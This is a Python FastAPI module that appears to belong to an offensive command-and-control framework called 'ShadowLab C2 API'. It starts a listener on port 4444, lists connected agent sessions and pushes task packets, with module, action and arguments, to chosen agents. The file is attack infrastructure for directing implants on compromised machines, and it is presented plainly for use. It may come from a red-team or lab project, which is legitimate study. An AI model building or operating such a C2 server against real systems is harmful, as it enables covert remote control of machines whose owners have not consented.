import asyncio
from .connection_protocol import *
from contextlib import asynccontextmanager
from fastapi import FastAPI, HTTPException

from core.management import session_manager
from core.server import async_server
from core.server import async_comm


class APIManager:
    def __init__(self, session_mngr: session_manager.SessionManager, address: str):
        self.session_manager = session_mngr
        self.address = address
        self.server = async_server.AsyncServer(address=self.address, session_manager=self.session_manager)
        self.server_task = None

    async def start_c2(self):
        self.server_task = asyncio.create_task(self.server.start())

    async def stop_c2(self):
        if self.server_task:
            self.server_task.cancel()

manager = APIManager(
    session_mngr=session_manager.SessionManager(),
    address="0.0.0.0:4444"
)

@asynccontextmanager
async def lifespan(app: FastAPI):
    await manager.start_c2()
    yield

    await manager.stop_c2()

app = FastAPI(title="ShadowLab C2 API", lifespan=lifespan)

@app.get("/api/v1/agents")
async def list_agents():
    sessions = await manager.session_manager.get_all_sessions()
    return return_all_sessions(sessions)


@app.post("/api/v1/agents/{session_id}/task")
async def send_task(session_id: int, req: TaskRequest):
    session = await manager.session_manager.get_session(session_id)
    if not session:
        raise HTTPException(status_code=404, detail="Agent Not Found")

    task_packet = create_task(
        session_id=str(session_id),
        module=req.module,
        action=req.action,
        args=req.args
    )

    try:
        await async_comm.async_send(session.writer, task_packet)
        return {
            "status": "success",
            "session_id": session_id,
            "payload": json.loads(task_packet)
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Failed to send task: {str(e)}")